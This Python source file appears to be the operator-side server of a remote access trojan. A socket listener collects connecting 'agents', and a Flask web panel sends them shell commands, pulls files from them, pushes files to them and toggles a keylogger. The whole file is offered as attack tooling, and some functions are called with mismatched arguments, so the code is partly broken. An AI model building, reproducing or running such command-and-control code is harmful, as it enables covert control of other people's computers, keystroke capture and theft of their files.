import socket
import threading
import flask
from flask import *
import time
from pathlib import Path

# Configure the listener server
ip_address = '127.0.0.1'
port_number = 1234

# Initialization of global variables
thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IPS = []

# Flask app initialization
app = Flask(__name__)

# Initialize the CMD_INPUT, CMD_OUTPUT, and IPS lists with an empty string
for i in range(20):
    CMD_INPUT.append("")
    CMD_OUTPUT.append("")
    IPS.append("")

# Functions to handle connections from clients
def handle_connection(connection, address, thread_index):
    global CMD_INPUT
    global CMD_OUTPUT

    # Waiting for the 'quit' command to terminate the connection
    while CMD_INPUT[thread_index]!='quit':
        # Receive messages from clients
        msg = connection.recv(1024).decode()
        CMD_OUTPUT[thread_index] = msg
        while True:
            # If there is an incoming command
            if CMD_INPUT[thread_index]!='':
                # If the command is to download a file `download <filename>`
                if CMD_INPUT[thread_index].split(" ")[0] == 'download':
                    filename = CMD_INPUT[thread_index].split(" ")[1].split("/")[-1]
                    print(filename)
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    contents = connection.recv(1024*10000)
                    f = open(filename, 'wb')
                    f.write(contents)
                    f.close()
                    CMD_OUTPUT[thread_index] = 'File Transferred Successfully'
                    CMD_INPUT[thread_index] = ''
                # If the command is to upload a file `upload <filename> 2048`
                elif CMD_INPUT[thread_index].split(" ")[0] == 'upload':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    filesize = CMD_INPUT[thread_index].split(" ")[2]
                    f = open('./output/' + filename, 'rb')
                    contents = f.read()
                    f.close()
                    connection.send(contents)
                    msg = connection.recv(2048).decode()
                    if msg == 'Got file':
                        CMD_OUTPUT[thread_index] = 'File Sent Successfully'
                        CMD_INPUT[thread_index] = ''
                    else:
                        CMD_OUTPUT[thread_index] = 'Some Error Occurred'
                        CMD_INPUT[thread_index] = ''
                # Keylogger operation
                elif CMD_INPUT[thread_index] == 'keylog on':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index] = msg
                    CMD_INPUT[thread_index] = ''
                elif CMD_INPUT[thread_index] == 'keylog off':
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index] = msg
                    CMD_INPUT[thread_index] = ''
                else:
                    msg = CMD_INPUT[thread_index]
                    # Send the received message back to the client.
                    connection.send(msg.encode())
                    CMD_INPUT[thread_index] = ''
                    break
    
    # Close the connection when finished
    close_connection(connection)
    
# Function to close the connection
def close_connection(connection, thread_index):
    connection.close()
    THREADS[thread_index]=''
    IPS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUTPUT[thread_index]=''

# Function to run the socket server
def server_socket():
    # AF_INET == IPv4 & SOCK_STREAM == TCP
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind((ip_address, port_number))
    ss.listen(5)

    global THREADS
    global IPS

    # Continue to receive connections
    while True:
        connection, address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection, args=(connection, address, len(THREADS)))
        THREADS.append(t)
        IPS.append(address)
        t.start()

# Starts the socket server the first time the app is run
@app.before_first_request
def init_server():
    s1 = threading.Thread(target=server_socket)
    s1.start()

# Flask app route definition
@app.route("/")
@app.route("/home")
def home():
    return render_template("index.html")

@app.route("/agents")
def agents():
    return render_template("agents.html", threads=THREADS, ips=IPS)

@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html", name=agentname)

@app.route("/<agentname>/execute", methods=['GET', 'POST'])
def execute(agentname):
    if request.method=='POST':
        cmd = request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        CMD_INPUT[req_index] = cmd
        time.sleep(1)
        cmdoutput = CMD_OUTPUT[req_index]
        return render_template("execute.html", cmdoutput=cmdoutput, name=agentname)

# Starting the Flask app
if __name__ == '__main__':
    app.run(debug=True)